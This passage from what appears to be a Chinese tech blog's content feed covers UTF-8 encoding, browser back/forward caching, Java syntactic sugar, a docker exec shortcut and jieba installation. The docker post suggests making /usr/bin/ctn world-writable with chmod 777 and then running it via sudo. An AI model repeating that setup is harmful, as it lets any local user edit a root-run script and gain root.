<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Unicode</span><br><span class="line">UTF-8</span><br><span class="line">0000 - 007F</span><br><span class="line">0xxxxxxx</span><br><span class="line">0080 - 07FF</span><br><span class="line">110xxxxx 10xxxxxx</span><br><span class="line">0800 - FFFF</span><br><span class="line">1110xxxx 10xxxxxx 10xxxxxx</span><br></pre></td></tr></table></figure>

<p>例如”汉”字的Unicode编码是6C49。6C49在0800-FFFF之间，所以要用3字节模板：1110xxxx 10xxxxxx 10xxxxxx。将6C49写成二进制是：0110 1100 0100 1001，将这个比特流按三字节模板的分段方法分为0110 110001 001001，依次代替模板中的x，得到：1110-0110 10-110001 10-001001，即E6 B1 89，这就是其UTF8的编码。</p>
<p>讲到这里，我们再顺便说说一个很著名的奇怪现象：当你在 windows 的记事本里新建一个文件，输入”联通”两个字之后，保存，关闭，然后再次打开，你会发现这两个字已经消失了，代之的是几个乱码！呵呵，有人说这就是联通之所以拼不过移动的原因。</p>
<p>其实这是因为GB2312编码与UTF8编码产生了编码冲撞的原因。</p>
<p>当一个软件打开一个文本时，它要做的第一件事是决定这个文本究竟是使用哪种字符集的哪种编码保存的。软件一般采用三种方式来决定文本的字符集和编码：</p>
<p>检测文件头标识，提示用户选择，根据一定的规则猜测</p>
<p>最标准的途径是检测文本最开头的几个字节，开头字节 Charset/encoding,如下表：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">EF BB BF UTF-8</span><br><span class="line">FF FE UTF-16/UCS-2, little endian</span><br><span class="line">FE FF UTF-16/UCS-2, big endian</span><br><span class="line">FF FE 00 00 UTF-32/UCS-4, little endian.</span><br><span class="line">00 00 FE FF UTF-32/UCS-4, big-endian.</span><br></pre></td></tr></table></figure>
<p>当你新建一个文本文件时，记事本的编码默认是ANSI（代表系统默认编码，在中文系统中一般是GB系列编码）, 如果你在ANSI的编码输入汉字，那么他实际就是GB系列的编码方式，在这种编码下，”联通”的内码是：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">c1 1100 0001</span><br><span class="line">aa 1010 1010</span><br><span class="line">cd 1100 1101</span><br><span class="line">a8 1010 1000</span><br></pre></td></tr></table></figure>
<p>注意到了吗？第一二个字节、第三四个字节的起始部分的都是”110”和”10”，正好与UTF8规则里的两字节模板是一致的，</p>
<p>于是当我们再次打开记事本时，记事本就误认为这是一个UTF8编码的文件，让我们把第一个字节的110和第二个字节的10去掉，我们就得到了”00001 101010”，再把各位对齐，补上前导的0，就得到了”0000 0000 0110 1010”，不好意思，这是UNICODE的006A，也就是小写的字母”j”，而之后的两字节用UTF8解码之后是0368，这个字符什么也不是。这就是只有”联通”两个字的文件没有办法在记事本里正常显示的原因。</p>
<p>而如果你在”联通”之后多输入几个字，其他的字的编码不见得又恰好是110和10开始的字节，这样再次打开时，记事本就不会坚持这是一个utf8编码的文件，而会用ANSI的方式解读之，这时乱码又不出现了。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>encoding</tag>
      </tags>
  </entry>
  <entry>
    <title>[转]浏览器前进/后退缓存（BF Cache）</title>
    <url>//bf-cache</url>
    <content><![CDATA[<hr>
[浏览器前进/后退缓存](https://developer.mozilla.org/en-US/docs/Working_with_BFCache)（Backward/Forward Cache，BF Cache）是指浏览器在前进后退过程中， 会应用更强的缓存策略，表现为 DOM、window、甚至 JavaScript 对象被缓存，以及同步 XHR 也被缓存。 这一现象在移动端浏览器尤为常见，除 Chrome for Android、Android Browser 之外的浏览器基本都会触发。

<p>BF Cache 本来是一项浏览器优化，但在某些情况下（比如前端路由的 Web App）会引起困惑。 本文主要讨论 BF Cache 的行为、如何检测 BF Cache 缓存、以及如何 workaround。</p>
<h3 id="缓存行为"><a href="#缓存行为" class="headerlink" title="缓存行为"></a>缓存行为</h3><p>BF Cache 是一种浏览器优化，HTML 标准并未指定其如何进行缓存，因此缓存行为是与浏览器实现相关的。</p>
<blockquote>
<p>User agents may discard the Document objects of entries other than the current entry that are not referenced from any script, reloading the pages afresh when the user or script navigates back to such pages. This specification does not specify when user agents should discard Document objects and when they should cache them. – <a href="https://html.spec.whatwg.org/multipage/browsers.html#history">Session history and navigation</a>, WHATWG</p>
</blockquote>
<ul>
<li>Desktop Chrome：阻塞的资源和同步发出的 XHR 都会被缓存，但不缓存渲染结果。因此可以看到明显的载入过程，此时脚本也会重新执行。</li>
<li>Chrome for Android：有些情况下不会缓存，缓存时与 Desktop Chrome 行为一致。</li>
<li>Desktop Firefox：页面会被 Frozen，定时器会被暂停，DOM、Window、JavaScript 对象会被缓存，返回时页面脚本重新开始运行。</li>
<li>iOS Safari：渲染结果也会被缓存，因此才能支持左右滑动手势来前进/后退。</li>
</ul>
<p>Desktop Firefox 暂停计时器的行为非常有趣，以下 HTML 中显示一个每秒加一的数字。 当页面导航时就会暂停，返回时继续增加（因此直接使用 setInterval 倒计时不仅不精确，而且不可靠）：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;timer-tick&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://harttle.com&quot;</span>&gt;</span>External Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> i = <span class="number">0</span></span></span><br><span class="line"><span class="javascript">  <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#timer-tick&#x27;</span>).innerHTML = i++, <span class="number">1000</span>)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="pagehide-pageshow-事件"><a href="#pagehide-pageshow-事件" class="headerlink" title="pagehide/pageshow 事件"></a>pagehide/pageshow 事件</h3><p>会话（Session）中的某一个页面显示/隐藏时，会触发 <code>pagehide</code> 和 <code>pageshow</code> 事件。 这两个事件都有一个 <code>persisted</code> 属性用来指示当前页面是否被 BF Cache 缓存。 因此可以通过 <code>persisted</code> 属性来达到禁用 BF Cache 的效果：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onpageshow = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.persisted) &#123;</span><br><span class="line">        <span class="built_in">window</span>.location.reload()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>注意无论页面是否被缓存 <code>pageshow</code> 总会触发，因此需要检测器 <code>persisted</code> 属性。 另外 <code>pageshow</code> 的时机总是在 <code>load</code> 事件之后。 这一点很容易检测，下面的 <code>pageshow</code> 日志总在 <code>load</code> 之前：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;pageshow&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;on pageshow&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;load&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;load&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="XHR-缓存"><a href="#XHR-缓存" class="headerlink" title="XHR 缓存"></a>XHR 缓存</h3><p>同步（阻塞加载的）脚本发出的 XMLHttpRequest 也会被 Chrome 强制缓存， 因此即使在断网的情况下后退到访问过的页面仍然是可以完美渲染的。 如果页面中有这样一段外部脚本：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">sendXHR();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendXHR</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">  xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/data.json&#x27;</span>)</span><br><span class="line">  xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState === XMLHttpRequest.DONE &amp;&amp;</span><br><span class="line">     xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;xhr arrived&#x27;</span>, xhr.responseText)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.send()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>超链接跳转后回来，该 xhr 也会被缓存。注意下图中的 XHR 一项 size 为 “from disk cache”：<br><img src="http://img.saodiyang.com/FiUT28A3DCpwPiyvJpsvhkdFQai1.png" class="lazyload" data-srcset="http://img.saodiyang.com/FiUT28A3DCpwPiyvJpsvhkdFQai1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>为了强制发送 xhr，可以将 xhr 改为异步发送，或者加一个不重要的 query。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(sendXHR, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<p>这样就能看到 xhr 真正发送出去了 :) 异步 xhr 缓存时机未经兼容性测试， 还是建议读者使用一个随机产生的 query。<br><img src="http://img.saodiyang.com/FjwUrogpYSRjC5EGPGIH2x1t2Eff.png" class="lazyload" data-srcset="http://img.saodiyang.com/FjwUrogpYSRjC5EGPGIH2x1t2Eff.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title>[转]谈谈Java中的语法糖</title>
    <url>//java-grammatical-sugar</url>
    <content><![CDATA[<blockquote>
<p>语法糖（Syntactic Sugar），也称糖衣语法，指在计算机语言中添加的某种语法，这种语法对语言本身功能来说没有什么影响，只是为了方便程序员的开发，提高开发效率。说白了，语法糖就是对现有语法的一个封装。</p>
</blockquote>
<p>Java作为一种与平台无关的高级语言，当然也含有语法糖，这些语法糖并不被虚拟机所支持，在编译成字节码阶段就自动转换成简单常用语法。一般来说Java中的语法糖主要有以下几种：</p>
<ol>
<li>泛型与类型擦除</li>
<li>自动装箱与拆箱，变长参数、</li>
<li>增强for循环</li>
<li>内部类与枚举类</li>
</ol>
<h2 id="泛型与类型擦除"><a href="#泛型与类型擦除" class="headerlink" title="泛型与类型擦除"></a>泛型与类型擦除</h2><p>Java语言并不是一开始就支持泛型的。在早期的JDK中，只能通过Object类是所有类型的父类和强制类型转换来实现泛型的功能。强制类型转换的缺点就是把编译期间的问题延迟到运行时，JVM并不能为我们提供编译期间的检查。</p>
<p>在JDK1.5中，Java语言引入了泛型机制。但是这种泛型机制是通过类型擦除来实现的，即Java中的泛型只在程序源代码中有效（源代码阶段提供类型检查），在编译后的字节码中自动用强制类型转换进行替代。也就是说，Java语言中的泛型机制其实就是一颗语法糖，相较与C++、C#相比，其泛型实现实在是不那么优雅。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 在源代码中存在泛型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Map&lt;String,String&gt; map = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;你好&quot;</span>);</span><br><span class="line">    String hello = map.get(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    System.out.println(hello);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当上述源代码被编译为class文件后，泛型被擦除且引入强制类型转换</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    HashMap map = <span class="keyword">new</span> HashMap(); <span class="comment">//类型擦除</span></span><br><span class="line">    map.put(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;你好&quot;</span>);</span><br><span class="line">    String hello = (String)map.get(<span class="string">&quot;hello&quot;</span>);<span class="comment">//强制转换</span></span><br><span class="line">    System.out.println(hello);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="自动装箱与拆箱"><a href="#自动装箱与拆箱" class="headerlink" title="自动装箱与拆箱"></a>自动装箱与拆箱</h2><blockquote>
<p>Java中的自动装箱与拆箱指的是基本数据类型与他们的包装类型之间的相互转换。</p>
</blockquote>
<p>我们知道Java是一门面向对象的语言，在Java世界中有一句话是这么说的：“万物皆对象”。但是Java中的基本数据类型却不是对象，他们不需要进行new操作，也不能调用任何方法，这在使用的时候有诸多不便。因此Java为这些基本类型提供了包装类，并且为了使用方便，提供了自动装箱与拆箱功能。自动装箱与拆箱在使用的过程中，其实是一个语法糖，内部还是调用了相应的函数进行转换。</p>
<p>下面代码演示了自动装箱和拆箱功能</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Integer a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> c = a + b;</span><br><span class="line">    System.out.println(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过编译后，代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Integer a = Integer.valueOf(<span class="number">1</span>); <span class="comment">// 自动装箱</span></span><br><span class="line">    <span class="keyword">byte</span> b = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> c = a.intValue() + b;<span class="comment">//自动拆箱</span></span><br><span class="line">    System.out.println(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="变长参数"><a href="#变长参数" class="headerlink" title="变长参数"></a>变长参数</h2><blockquote>
<p>所谓变长参数，就是方法可以接受长度不定确定的参数</p>
</blockquote>
<p>变长参数特性是在JDK1.5中引入的，使用变长参数有两个条件，一是变长的那一部分参数具有相同的类型，二是变长参数必须位于方法参数列表的最后面。变长参数同样是Java中的语法糖，其内部实现是Java数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Varargs</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String... args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(String str : args)&#123;</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        print(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译为class文件后如下，从中可以很明显的看出变长参数内部是通过数组实现的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Varargs</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Varargs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String... args)</span> </span>&#123;</span><br><span class="line">        String[] var1 = args;</span><br><span class="line">        <span class="keyword">int</span> var2 = args.length;</span><br><span class="line">        <span class="comment">//增强for循环的数组实现方式</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var3 = <span class="number">0</span>; var3 &lt; var2; ++var3) &#123;</span><br><span class="line">            String str = var1[var3];</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//变长参数转换为数组</span></span><br><span class="line">        print(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h2><blockquote>
<p>增强for循环与普通for循环相比，功能更强并且代码更简洁</p>
</blockquote>
<p>增强for循环的对象要么是一个数组，要么实现了Iterable接口。这个语法糖主要用来对数组或者集合进行遍历，其在循环过程中不能改变集合的大小。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    String[] params = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">//增强for循环对象为数组</span></span><br><span class="line">    <span class="keyword">for</span>(String str : params)&#123;</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; lists = Arrays.asList(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    <span class="comment">//增强for循环对象实现Iterable接口</span></span><br><span class="line">    <span class="keyword">for</span>(String str : lists)&#123;</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译后的class文件为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">   String[] params = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>&#125;;</span><br><span class="line">   String[] lists = params;</span><br><span class="line">   <span class="keyword">int</span> var3 = params.length;</span><br><span class="line">   <span class="comment">//数组形式的增强for退化为普通for</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> str = <span class="number">0</span>; str &lt; var3; ++str) &#123;</span><br><span class="line">       String str1 = lists[str];</span><br><span class="line">       System.out.println(str1);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   List var6 = Arrays.asList(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>&#125;);</span><br><span class="line">   Iterator var7 = var6.iterator();</span><br><span class="line">   <span class="comment">//实现Iterable接口的增强for使用iterator接口进行遍历</span></span><br><span class="line">   <span class="keyword">while</span>(var7.hasNext()) &#123;</span><br><span class="line">       String var8 = (String)var7.next();</span><br><span class="line">       System.out.println(var8);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><blockquote>
<p>内部类就是定义在一个类内部的类</p>
</blockquote>
<p>Java语言中之所以引入内部类，是因为有些时候一个类只在另一个类中有用，我们不想让其在另外一个地方被使用。内部类之所以是语法糖，是因为其只是一个编译时的概念，一旦编译完成，编译器就会为内部类生成一个单独的class文件，名为outer$innter.class。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用javac编译后，生成两个class文件Outer.class和Outer$Inner.class，其中Outer$Inner.class的内容如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span>$<span class="title">Inner</span> </span>&#123;</span><br><span class="line">    Outer$Inner(Outer var1) &#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0</span> = var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>内部类分为四种：成员内部类、局部内部类、匿名内部类、静态内部类，每一种都有其用法，这里就不介绍了</p>
<h2 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h2><blockquote>
<p>枚举类型就是一些具有相同特性的类常量</p>
</blockquote>
<p>java中类的定义使用class，枚举类的定义使用enum。在Java的字节码结构中，其实并没有枚举类型，枚举类型只是一个语法糖，在编译完成后被编译成一个普通的类。这个类继承java.lang.Enum，并被final关键字修饰。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">Fruit</span> </span>&#123;</span><br><span class="line">    APPLE,ORINGE</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用jad对编译后的class文件进行反编译后得到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//继承java.lang.Enum并声明为final</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Fruit</span> <span class="keyword">extends</span> <span class="title">Enum</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Fruit[] values()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> (Fruit[])$VALUES.clone();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Fruit <span class="title">valueOf</span><span class="params">(String s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (Fruit)Enum.valueOf(Fruit, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Fruit</span><span class="params">(String s, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(s, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//枚举类型常量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Fruit APPLE;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Fruit ORANGE;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Fruit $VALUES[];<span class="comment">//使用数组进行维护</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span></span><br><span class="line">    &#123;</span><br><span class="line">        APPLE = <span class="keyword">new</span> Fruit(<span class="string">&quot;APPLE&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        ORANGE = <span class="keyword">new</span> Fruit(<span class="string">&quot;ORANGE&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        $VALUES = (<span class="keyword">new</span> Fruit[] &#123;</span><br><span class="line">            APPLE, ORANGE</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>进入docker容器命令制作</title>
    <url>//entering-docker</url>
    <content><![CDATA[<h2 id="通过attach进入容器"><a href="#通过attach进入容器" class="headerlink" title="通过attach进入容器"></a>通过attach进入容器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入容器（Docker自带的命令）</span></span><br><span class="line">$ sudo docker attach [name]</span><br></pre></td></tr></table></figure>
<p>通过这命令进入容器后，执行ctrl+d退出容器后发现容器也停止了。<br>所以可以通过</p>
<ul>
<li>先按，ctrl+p</li>
<li>再按，ctrl+q</li>
</ul>
<p>退出</p>
<h2 id="制作进入容器的命令"><a href="#制作进入容器的命令" class="headerlink" title="制作进入容器的命令"></a>制作进入容器的命令</h2><p>既然attach退出很麻烦，一不小心容器就down掉了</p>
<p>通过 <code>docker exec</code> 进入容器是安全的，但是命令过长</p>
<p>所以我们可以通过下面操作，简化命令</p>
<p>1.创建文件 <code>/usr/bin/ctn</code>,内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it $1 /bin/bash</span><br></pre></td></tr></table></figure>
<p>2.检查环境变量有没有配置目录 <code>/usr/bin</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$PATH</span><br><span class="line">bash: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games: No such file or directory</span><br></pre></td></tr></table></figure>
<p>配置环境变量的方式自行百度</p>
<p>3.完成上面两步即可通过命令 <code>ctn</code> 进入容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ctn [name]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：如果是使用非root账号创建的命令，而docker命令是root权限，可能会存在权限问题<br>可以设置 <code>chmod 777 /usr/bin/ctn</code> 设置权限<br>使用 <code>sudo ctn [name]</code> 即可进入容器</p>
</blockquote>
<p>4.自动补全docker名<br>使用上面命令时，docker的名字都是手动输入，很麻烦，而且容易出错。</p>
<p>我们可以借助complete命令，来补全docker信息。</p>
<p>在~/.bashrc(作用于当前用户，如果所有用户，修改/etc/bashrc)文件中添加一行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ctn auto complete</span></span><br><span class="line">complete -W <span class="string">&quot;<span class="subst">$(docker ps --format <span class="string">&quot;&#123;&#123;.Names&#125;&#125;&quot;</span>)</span>&quot;</span> ctn</span><br></pre></td></tr></table></figure>
<p>再执行 <code>source .bashrc</code> 使之生效。</p>
<p>这样我们输入 <code>ctn</code> 后，按 <code>Tab</code> 就会提示或自动补全了。</p>
<blockquote>
<p><code>注意：</code> 由于提示的docker名是 <code>.bashrc</code> 生效时的列表，所以如果之后docker列表有变动，需重新执行 <code>source .bashrc</code> 使之更新提示列表</p>
</blockquote>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>jieba库的使用大全</title>
    <url>//jieba%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8%E5%A4%A7%E5%85%A8</url>
    <content><![CDATA[<h1 id="jieba库的使用大全"><a href="#jieba库的使用大全" class="headerlink" title="jieba库的使用大全"></a>jieba库的使用大全</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>jieba 是一个第三方库，所有需要我们在本地进行安装。<br>Windows 下使用命令安装：在联网状态下，在anaconda命令行下输入 pip install jieba 进行安装，安装完成后会提示安装成功 .</p>
<h2 id="分词使用"><a href="#分词使用" class="headerlink" title="分词使用"></a>分词使用</h2><p>分词的语法就不讲解啦，什么前向匹配，逆向匹配，还需要一个足够大的本地词典。自己构造挺麻烦的。<br>直接使用包吧。</p>
